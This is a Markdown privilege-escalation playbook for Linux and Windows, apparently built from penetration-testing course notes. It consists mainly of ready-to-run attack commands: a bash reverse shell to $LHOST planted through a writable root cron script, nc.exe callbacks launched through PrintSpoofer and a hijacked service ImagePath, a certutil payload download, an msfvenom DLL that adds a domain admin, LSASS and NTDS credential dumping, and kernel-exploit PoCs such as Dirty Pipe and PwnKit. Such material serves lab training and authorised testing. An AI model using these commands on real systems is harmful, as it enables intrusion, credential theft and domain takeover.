# 06 - Privilege Escalation

**IF** you land a low-priv shell → go by OS: Linux (`uname`/`id`) → `## Linux` below; Windows (`whoami /priv`) → `## Windows` further down. A cross-OS box (e.g. an MSSQL `xp_cmdshell` shell on a Linux docker host) → use the technique for the OS the *command* runs on, not where you started.

## Linux

## Enumeration checklist (first pass — surfaces every branch below)
**IF** you just landed a low-priv Linux shell →
- [ ] run the orientation set; branch on whatever it prints.
```bash
whoami
id
sudo -l
uname -a
cat /etc/passwd
ls -l ~/.ssh
history
crontab -l
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```
WHY: one pass surfaces OS/kernel version, sudo rights, SUID/caps, writable files and containers — each maps to a branch below.
- [ ] works → `id` → group branch; SUID hit → GTFOBins; `sudo -l` hit → sudo branch.
- [ ] fails → manual enumeration is required; LinPEAS/LinEnum are helpers only.
- [ ] ⏱ >15 min with no vector → jump to the kernel-CVE branch or [[08 - Active Directory & Lateral Movement]].
→ [[22. Linux PrivEsc/1. Linux privilege escalation|src]] [[22. Linux PrivEsc/2. Environment Enumeration|src]] [[22. Linux PrivEsc/3. Linux Services & Internals Enumeration|src]]

## Credential hunting (config files, histories, keys)
**IF** the box runs a webapp, or you need `$PASS` to pivot/reuse →
- [ ] grep configs and histories for cleartext creds; list SSH keys.
```bash
grep 'DB_USER\|DB_PASSWORD' wp-config.php
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null
ls ~/.ssh
```
WHY: configs and `*_history` files frequently carry cleartext app/DB creds and reused passwords.
- [ ] works → validate every hit against all users (reuse is common) → [[04 - Credentials & Common Services]].
- [ ] fails → widen to `/etc/passwd` + shadow reuse and unmounted drives.
- [ ] ⏱ 10 min → move to the SUID/sudo branches (creds not required).
→ [[22. Linux PrivEsc/4. Credential Hunting|src]]

## $PATH abuse (writable dir or `.` in $PATH)
**IF** `echo $PATH` lists a writable dir or `.` (esp. first) →
- [ ] prepend cwd and drop a fake binary named after an unqualified command a root process calls.
```bash
echo $PATH
PATH=.:$PATH
export PATH
echo 'echo "PATH ABUSE!!"' > ls
chmod +x ls
```
WHY: if `.` resolves first, your fake binary runs instead of the real one — as the caller's privilege.
- works (root runs the bare command) → you get root execution.
- [ ] fails → plant the binary in ANY writable dir earlier in `$PATH`, not just cwd.
- [ ] ⏱ only if a root process calls an unqualified command → else skip to SUID/cron.
→ [[22. Linux PrivEsc/5. Path Abuse|src]]

## SUID / SGID & capabilities
**IF** a root-owned binary carries the `s` bit, or `getcap` shows a capability →
- [ ] list both, then check every hit against GTFOBins.
```bash
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
getcap /usr/bin/vim.basic
```
WHY: setuid runs as root; `cap_dac_override` bypasses file read/write DACs — either can read/edit `/etc/shadow`.
- [ ] works → https://gtfobins.github.io/ for the exact binary (use the services-enum GTFOBins oneliner).
- [ ] fails → combine with cron/wildcard/library hijack instead.
- [ ] ⏱ 10 min → if nothing exploitable, jump to sudo/cron.
→ [[22. Linux PrivEsc/8. Special Permissions|src]] [[22. Linux PrivEsc/11. Capabilities|src]]

## Sudo rights abuse
**IF** `sudo -l` lists any allowed command (esp. `NOPASSWD`) →
- [ ] run each allowed binary through GTFOBins; note the sudo version.
```bash
sudo -l
sudo -V
```
WHY: a sudo-allowed binary that spawns a shell or edits files → root.
- [ ] works → GTFOBins entry for the exact binary.
- [ ] fails → pair with `env_keep+=LD_PRELOAD` (library branch) or `PYTHONPATH` (Python branch).
- [ ] ⏱ 10 min → jump to cron or kernel.
→ [[22. Linux PrivEsc/9. Sudo Rights Abuse|src]] · [[22. Linux PrivEsc/24. Sudo|src]] — STUB: no command; enum the sudo version for known vulns only, else GTFOBins on the `sudo -l` binary.

## Privileged group & containers (lxc/lxd + docker)
**IF** `id` shows `lxc`/`lxd`, OR you're in a container (`/.dockerenv`, `kubepods` in `/proc/1/cgroup`), OR the docker socket is reachable →
- [ ] mount the host `/` via a privileged container and read host files.
```bash
lxc image import ubuntu-template.tar.xz --alias ubuntutemp
lxc init ubuntutemp privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
docker -H unix:///var/run/docker.sock ps
docker run --rm -it -v /:/mnt ubuntu chroot /mnt bash
```
WHY: lxd/docker group membership lets you start a privileged container that sees/mounts the host root.
- [ ] works → read `/mnt/root` `/etc/shadow`, `/root/.ssh`, host configs.
- [ ] fails → no image → find a password-less template; fetch a static docker binary (`wget http://$LHOST/docker`).
- [ ] ⏱ 10 min → STUB: [[22. Linux PrivEsc/17. Kubernetes|17. Kubernetes]] has no operational technique — use the docker/lxd path above instead.
→ [[22. Linux PrivEsc/10. Privileged Groups|src]] [[22. Linux PrivEsc/14. Containers|src]] [[22. Linux PrivEsc/15. Docker|src]]

## Cron & wildcard abuse (root runs a writable script / `tar *` / logrotate)
**IF** a root cron executes a world-writable script, OR a root script runs `tar ... *`, OR root logrotate runs over a writable log on a vulnerable build →
- [ ] back up, then append a reverse shell or plant `--checkpoint` filenames.
```bash
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
./pspy64 -pf -i 1000
grep -R "tar .* \*" /etc/cron* 2>/dev/null
echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > --checkpoint=1
cp script.sh script.sh.bak
bash -i >& /dev/tcp/$LHOST/443 0>&1
nc -lvnp 443
```
WHY: a world-writable script run by root (or `*` expanding `--checkpoint-action=exec`) executes your code as root each interval.
- [ ] works → root shell on the next tick (pspy64 shows `UID=0 CMD:`); wildcard → `sudo su`.
- [ ] fails → use pspy64 output for path/user/frequency; logrotate: `grep "create\|compress" /etc/logrotate.conf | grep -v "#"`.
- [ ] ⏱ 10 min waiting → if no root job, jump to kernel CVEs.
→ [[22. Linux PrivEsc/6. Wildcard Abuse|src]] [[22. Linux PrivEsc/13. Cron Job Abuse|src]] [[22. Linux PrivEsc/18. Logrotate|src]]

## Library hijacking (LD_PRELOAD / RUNPATH / Python)
**IF** `sudo -l` shows `env_keep+=LD_PRELOAD` or `PYTHONPATH`, OR a binary links a library from a writable RUNPATH →
- [ ] drop a malicious library/module and load it.
```bash
ldd /bin/ls
gcc -fPIC -shared -o root.so root.c -nostartfiles
sudo LD_PRELOAD=/tmp/root.so /path/to/allowed/binary
readelf -d payroll | grep PATH
cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py
```
WHY: `LD_PRELOAD` loads your `.so` first (as root via sudo); RUNPATH dirs are searched before system paths; Python runs the script as root.
- [ ] works → the injected `_init()`/symbol/module runs as root.
- [ ] fails → match the required symbol/function name AND signature (from the `undefined symbol:` error).
- [ ] ⏱ 10 min → jump to kernel CVEs if none apply.
→ [[22. Linux PrivEsc/21. Shared Libraries|src]] [[22. Linux PrivEsc/22. Shared Object Hijacking|src]] [[22. Linux PrivEsc/23. Python Library Hijacking|src]]

## Kernel & privilege CVEs (kernel / Dirty Pipe / Netfilter / Polkit / GNU Screen)
**IF** you have the kernel/service version or `pkexec` present →
- [ ] fingerprint, then run the version-matching PoC.
```bash
uname -a
uname -r
screen -v
```
WHY: kernel and privileged-component bugs execute code as root; version-matching is mandatory (a wrong PoC crashes the box).
| Vector | Range / trigger | Commands |
|---|---|---|
| GNU Screen 4.5.0 | `screen -v` vulnerable build | `./screen_exploit.sh` (needs setuid screen + `gcc`) |
| Dirty Pipe CVE-2022-0847 | k5.8–5.17 | `git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git` → `bash compile.sh` → `/exploit-2 /usr/bin/sudo` |
| Netfilter CVE-2021-22555 | k2.6–5.11 | `gcc -m32 -static exploit.c -o exploit` → `./exploit` |
| Netfilter CVE-2022-25636 | k5.4–5.6.10 | `git clone https://github.com/Bonfee/CVE-2022-25636.git` → `make` → `./exploit` |
| Netfilter CVE-2023-32233 | k ≤ 6.3.1 | `git clone https://github.com/Liuk3r/CVE-2023-32233` → `gcc -Wall -o exploit exploit.c -lmnl -lnftnl` → `./exploit` |
| Polkit Pwnkit CVE-2021-4034 | pkexec present | `git clone https://github.com/arthepsy/CVE-2021-4034.git` → `gcc cve-2021-4034-poc.c -o poc` → `./poc` |
- [ ] works → root shell; `id` shows `uid=0(root)`.
- [ ] fails → confirm the exact range/version first; CVE-2022-25636 corrupts the kernel (reboot required).
- [ ] ⏱ 15 min → if no reliable PoC, return to sudo/cron.
→ [[22. Linux PrivEsc/12. Vulnerable Services|src]] [[22. Linux PrivEsc/20. Kernel Exploits|src]] [[22. Linux PrivEsc/26. Dirty Pipe|src]] [[22. Linux PrivEsc/27. Netfilter|src]] [[22. Linux PrivEsc/25. Polkit|src]]

## Misc (restricted shell / traffic capture / NFS / tmux)
**IF** the shell is restricted (rbash/rksh/rzsh), `tcpdump` is present, an NFS export is `no_root_squash`, OR a root tmux socket is group-accessible →
- [ ] use the matching opportunistic path.
```bash
ls -l `pwd`
cp shell /mnt
chmod u+s /mnt/shell
/tmp/shell
tmux -S /shareds
```
WHY: restricted shells can't block substitution; cleartext protocols leak creds; `no_root_squash` keeps owner root on upload; a shared tmux socket is root's session.
- [ ] works → run the SUID shell / reuse captured creds / land in root's tmux.
- [ ] fails → restricted-shell escapes: substitution, chaining (`;`/`|`/`&&`), env-var redirect, functions; parse pcaps with net-creds/PCredz.
- NFS (`no_root_squash`) → enumerate + mount the export with [[02 - External Recon & Enumeration]] §NFS (`showmount -e $TARGET`), then the SUID-shell steps above.
- [ ] ⏱ 10 min → opportunistic only; else return to sudo/SUID.
→ [[22. Linux PrivEsc/7. Escaping restricted shells|src]] [[22. Linux PrivEsc/19. Miscellaneous|src]]

## Windows

## Enumeration checklist (+ tools & protections)
**IF** you just landed a low-priv Windows shell →
- [ ] drop tools into `C:\Windows\Temp`, check Defender/AppLocker, and run the baseline; the token privilege and group you see select the branches below.
```bash
whoami /priv
whoami /groups
systeminfo
tasklist /svc
netstat -ano
net localgroup administrators
Get-MpComputerStatus
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
.\winPEAS.exe
.\SharpUp.exe audit
pipelist.exe /accepteula
gci \\.\pipe\
```
WHY: `C:\Windows\Temp` is writable by `BUILTIN\Users`; the cmdlets tell you if payloads run; the baseline surfaces privileges, groups, KBs and loopback listeners.
- [ ] works → match `whoami /priv` or `whoami /groups` to the branches below.
- [ ] fails → `wmic qfe get Caption,Description,HotFixID,InstalledOn` if `systeminfo` omits hotfixes; if blocked, pivot to LOLBAS `certutil`/`rundll32`.
- [ ] ⏱ 10 min → don't fight AppLocker; use the Misc techniques branch.
→ [[23. Windows PrivEsc/1. Useful Tools|src]] [[23. Windows PrivEsc/2. Enumerating Protections|src]] [[23. Windows PrivEsc/3. Initial Enumeration|src]] [[23. Windows PrivEsc/4. Communication with Processes|src]] [[23. Windows PrivEsc/5. Windows Privileges Overview|src]]

## SeImpersonate / SeAssignPrimaryToken (Potato family / PrintSpoofer)
**IF** `whoami /priv` shows `SeImpersonatePrivilege ... Enabled` (common on service accounts after MSSQL/IIS/Jenkins RCE) →
- [ ] run the OS-appropriate Potato exploit and catch the SYSTEM shell.
```bash
xp_cmdshell whoami /priv
sudo nc -lnvp $LPORT
xp_cmdshell c:\tools\JuicyPotato.exe
xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe $LHOST $LPORT -e cmd"
```
WHY: `SeImpersonatePrivilege` lets a process steal the winlogon token → `NT AUTHORITY\SYSTEM`.
- [ ] works → `whoami` confirms SYSTEM.
- [ ] fails → tool by OS: 2016/<1809 → JuicyPotato; 2019/1809+ → PrintSpoofer; newer → RoguePotato.
- [ ] ⏱ 10 min → UAC may block it unelevated; bypass UAC first.
→ [[23. Windows PrivEsc/6. SeImpersonate and SeAssignPrimaryToken|src]]

## SeDebugPrivilege (LSASS dump / SYSTEM child)
**IF** `whoami /priv` lists `SeDebugPrivilege` →
- [ ] dump LSASS with ProcDump and extract hashes with Mimikatz.
```bash
procdump.exe -accepteula -ma lsass.exe lsass.dmp
mimikatz.exe
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```
WHY: SeDebugPrivilege opens any process; LSASS holds logon hashes → pass-the-hash.
- [ ] works → crack/PtH the dumped hashes → [[04 - Credentials & Common Services]].
- [ ] fails → no tools + RDP: Task Manager → Details → Create a dump file.
- [ ] ⏱ 10 min → needs an elevated shell; else the UAC branch.
→ [[23. Windows PrivEsc/7. SeDebugPrivilege|src]]

## SeTakeOwnershipPrivilege
**IF** `whoami /priv` shows `SeTakeOwnershipPrivilege` and you need a protected file →
- [ ] enable it, take ownership, grant Full Control, read.
```bash
Import-Module .\Enable-Privilege.ps1
.\EnableAllTokenPrivs.ps1
takeown /f 'C:\Department Shares\Private\IT\cred.txt'
icacls 'C:\Department Shares\Private\IT\cred.txt' /grant $USER:F
cat 'C:\Department Shares\Private\IT\cred.txt'
```
WHY: grants Write_OWNER over any object — but NOT read; always follow with `icacls ... /grant`.
- [ ] works → read protected files (`web.config`, hives, creds).
- [ ] fails → check parent dir ownership (`dir /q`); enable the disabled privilege first.
- [ ] ⏱ 10 min → revert ACLs afterwards; else jump to Backup Operators.
→ [[23. Windows PrivEsc/8. SeTakeOwnershipPrivilege|src]]

## Backup Operators (SeBackupPrivilege / SeRestorePrivilege → NTDS)
**IF** `whoami /groups` shows Backup Operators (or you're on a DC) →
- [ ] shadow-copy `C:`, pull NTDS.dit + hives, dump domain hashes.
```bash
Import-Module .\SeBackupPrivilegeCmdLets.dll
Set-SeBackupPrivilege
reg save HKLM\SYSTEM SYSTEM.SAV
robocopy /B E:\Windows\NTDS .\ntds ntds.dit
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
WHY: SeBackupPrivilege reads ANY file bypassing ACLs; a DC's NTDS.dit = all domain NTLM hashes.
- [ ] works → domain-wide PtH/crack → DA.
- [ ] fails → `ntds.dit` is locked → use diskshadow, or native `robocopy /B` (no external tools).
- [ ] ⏱ 20 min (shadow copy) → a Deny ACE still blocks you; else jump to AD.
→ [[23. Windows PrivEsc/9. Windows Built-in Groups|src]]

## DnsAdmins
**IF** `Get-ADGroupMember -Identity DnsAdmins` confirms membership →
- [ ] point the DNS server-level plugin DLL at a malicious DLL, restart DNS → SYSTEM.
```bash
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
sc.exe stop dns
sc.exe start dns
```
WHY: DNS loads `ServerLevelPluginDll` as SYSTEM on its next start.
- [ ] works → `netadm` becomes a Domain Admin.
- [ ] fails → WPAD abuse: `Set-DnsServerGlobalQueryBlockList -Enable $false ...` + add a `wpad` A record; capture with Responder.
- [ ] ⏱ 15 min → loading often crashes DNS; clean-up requires admin.
→ [[23. Windows PrivEsc/11. DnsAdmins|src]]

## Privileged built-in groups (Hyper-V / Print Operators / Server Operators / Event Log Readers)
**IF** `whoami /groups` shows one of these groups →
- [ ] apply the matching primitive:
| Group | Primitive | Key commands |
|---|---|---|
| Event Log Readers | 4688 command-line creds | `wevtutil qe Security /rd:true /f:text | Select-String "/user"` |
| Hyper-V Administrators | clone a virtualized DC (offline VHD → NTDS), or VMMS hard-link | `takeown /F "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"` → `sc.exe start MozillaMaintenance` |
| Print Operators | `SeLoadDriverPrivilege` → load `Capcom.sys` | `reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"` → `EnableSeLoadDriverPrivilege.exe` → `.\ExploitCapcom.exe` |
| Server Operators | rewrite a SYSTEM service `binPath` | `sc.exe config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"` → `sc start AppReadiness` |
WHY: each group confers a SYSTEM-reaching primitive (cred log read, VHD clone, driver load, service control).
- [ ] works → SYSTEM / local admin / DC hashes / harvested creds.
- [ ] fails → enable the privilege / bypass UAC first; confirm access with `c:\Tools\PsService.exe security AppReadiness`.
- [ ] ⏱ 15 min each → hard-link vector mitigated since Mar 2020; else move to Weak Permissions.
→ [[23. Windows PrivEsc/10. Event Log Readers|src]] [[23. Windows PrivEsc/12. Hyper-V Administrators|src]] [[23. Windows PrivEsc/13. Print Operators|src]] [[23. Windows PrivEsc/14. Server Operators|src]]

## UAC — Administrators with a filtered token
**IF** you're in Administrators but the process runs standard integrity (or a technique needs elevation) →
- [ ] recon the UAC state, then apply a bypass.
```bash
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
[environment]::OSVersion.Version
```
WHY: UAC is a consent speed bump, not a boundary; the build number selects which bypass works.
- [ ] works → apply UACME #54 DLL hijack or the CVE-2019-1388 GUI chain.
- [ ] fails → `EnableLUA 0x1` = on; `ConsentPromptBehaviorAdmin 0x5` = always notify (hardest).
- [ ] ⏱ 10 min → cross-reference the Windows build table; else move on.
→ [[23. Windows PrivEsc/15. User Account Control (UAC)|src]]

## Weak Permissions (service binary/config/registry/unquoted path)
**IF** a SYSTEM service has a permission flaw — writable binary, writable `binPath`, unquoted path, or writable `ImagePath`/Run key →
- [ ] replace the binary, change `binPath`, plant an exe, or edit `ImagePath`.
```bash
.\SharpUp.exe audit
accesschk.exe /accepteula -quvcw WindscribeService
sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
```
WHY: services run as SYSTEM → any write to the binary/`binPath`/`ImagePath` runs your code as SYSTEM.
- [ ] works → SYSTEM (a 1053 error on `sc start` is fine — the command already ran).
- [ ] fails → use `net user hacker P@ssw0rd /add && net localgroup administrators hacker /add` as the payload.
- [ ] ⏱ 15 min → back up the original binary and restore after; else move on.
→ [[23. Windows PrivEsc/16. Weak Permissions|src]]

## Kernel & version CVEs (patches / HiveNightmare / PrintNightmare / installed apps)
**IF** the host looks old/unpatched, or a third-party service runs as SYSTEM →
- [ ] fingerprint build + hotfixes (and installed apps), match a CVE, run the public PoC.
```bash
systeminfo
wmic qfe get Caption,Description,HotFixID,InstalledOn
.\HiveNightmare.exe
impacket-secretsdump -sam SAM-2021-08-07 -system SYSTEM-2021-08-07 -security SECURITY-2021-08-07 local
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"
wmic product get name
netstat -ano | findstr <PORT>
```
WHY: a missing hotfix or a vulnerable installed service → a known local-root CVE; workflow = build → missing bulletin → PoC.
- [ ] works → `whoami` = `nt authority\system`.
- [ ] fails → Server/desktop: `Import-Module .\Sherlock.ps1; Find-AllVulns` or `python2 windows-exploit-suggester.py --database <updated.xls> --systeminfo systeminfo.txt`; MS16-032 via `Import-Module .\Invoke-MS16-032.ps1; Invoke-MS16-032`; Druva 6.6.3 (exploit-db 49211) via its `netstat → PID → Get-Service` path.
- [ ] ⏱ 20 min → PrintNightmare is loud (confirm scope); if 445 is firewalled, forward it and run the RCE locally.
→ [[23. Windows PrivEsc/17. Kernel Exploits|src]] [[23. Windows PrivEsc/18. Vulnerable Services|src]] [[23. Windows PrivEsc/27. Windows Server|src]] [[23. Windows PrivEsc/28. Windows Desktop Versions|src]]

## Credential hunting (files, PowerShell history, saved creds)
**IF** you have file/command access and want stored secrets →
- [ ] sweep configs/files/histories, then saved creds, browsers, managers.
```bash
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
gc (Get-PSReadLineOption).HistorySavePath
cmdkey /list
.\lazagne.exe all
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
netsh wlan show profile ilfreight_corp key=clear
```
WHY: plaintext creds hide in app configs, PSReadLine history, browser stores, Autologon and Wi-Fi PSKs.
- [ ] works → validate every hit across all users (reuse/spray).
- [ ] fails → widen with `dir /S /B *pass*.txt ...` and Sticky Notes `strings plum.sqlite*`.
- [ ] ⏱ 15 min → DPAPI `pass.xml` needs that user's context; else move to privileges.
→ [[23. Windows PrivEsc/20. Credential Hunting|src]] [[23. Windows PrivEsc/21. Other files|src]] [[23. Windows PrivEsc/22. Further Credential Theft|src]]

## Traffic capture & pillaging (users + post-compromise loot)
**IF** other users' traffic may leak creds, or you're post-compromise and want more than creds →
- [ ] sniff/coerce NTLMv2, then loot apps, cookies and backup repos.
```bash
sudo responder -w -v -I tun0
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
python3 mremoteng_decrypt.py -s "<encrypted_password>"
Invoke-SharpChromium -Command "cookies slack.com"
restic.exe -r E:\restic2\ snapshots
```
WHY: NTLMv2 coerced to an attacker SMB server cracks offline; mRemoteNG/browser/backup stores hold reusable secrets.
- [ ] works → reuse recovered creds/cookies/keys.
- [ ] fails → SCFs no longer work on 2019 → use a malicious `.lnk`; mRemoteNG default master `mR3m`.
- [ ] ⏱ 20 min (coercion latency) → else move on.
→ [[23. Windows PrivEsc/24. Interacting with Users|src]] [[23. Windows PrivEsc/25. Pillaging|src]]

## Misc techniques (LOLBAS / AlwaysInstallElevated / Citrix breakout / DLL stub)
**IF** you need transfer/exec primitives, an MSI elevation, a restricted-GUI breakout, or scheduled-task/VHD escalation →
- [ ] use LOLBAS, `AlwaysInstallElevated`, a UNC path, scheduled tasks and mounted disks.
```bash
certutil.exe -urlcache -split -f http://$LHOST:8080/shell.bat shell.bat
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart
guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk
smbserver.py -smb2support share $(pwd)
\\127.0.0.1\c$\users\pmorgan
Write-UserAddMSI
```
WHY: `certutil` transfers/encodes without tools; `AlwaysInstallElevated` (both keys) runs an MSI as SYSTEM; a UNC path beats a File Explorer restriction; mounted VHD/VMDK expose hives.
- works (both AIE keys `0x1`) → `msiexec /i aie.msi /quiet /qn /norestart`; Citrix → `Write-UserAddMSI` then `runas /user:backdoor cmd`.
- [ ] fails → CVE-2019-1388 GUI chain (patched Nov 2019); scheduled-task weak perms via `.\accesschk64.exe /accepteula -s -d C:\Scripts\`.
- [ ] ⏱ 15 min → STUB: [[23. Windows PrivEsc/19. DLL Injection|19. DLL Injection]] is a pointer to the academy module only (no command) — use the LOLBAS / AlwaysInstallElevated path above instead.
→ [[23. Windows PrivEsc/26. Misc Techniques|src]] [[23. Windows PrivEsc/23. Citrix Breakout|src]]

## Loop-back (got root / SYSTEM → loot and move)
**IF** you now hold root (Linux) or SYSTEM (Windows) →
- [ ] loot the credential plane, then feed it back into the loop.
- [ ] Linux root → read `/etc/shadow`, `/root/.ssh`, `~/.ssh`, cloud creds, git remotes, app configs; harvest other users' histories.
- [ ] Windows SYSTEM → `secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL`; LSASS (`sekurlsa::logonpasswords`); PwDump (`pwdump8.exe` → `hashcat -m 1000`); if a DC, Backup Operators NTDS.
- [ ] New creds → spray/reuse sideways → [[04 - Credentials & Common Services]]; new hosts/subnets → [[07 - Pivoting & Tunneling]].
- [ ] Domain context → pivot to [[08 - Active Directory & Lateral Movement]]; if the DC sits on an unreachable subnet, build the tunnel ([[07 - Pivoting & Tunneling]]) first, then `08`.
- [ ] ⏱ Escalate before pivoting; a root box with no new creds still isn't a flag.
→ [[23. Windows PrivEsc/29. PwDump|src]] [[23. Windows PrivEsc/22. Further Credential Theft|src]]
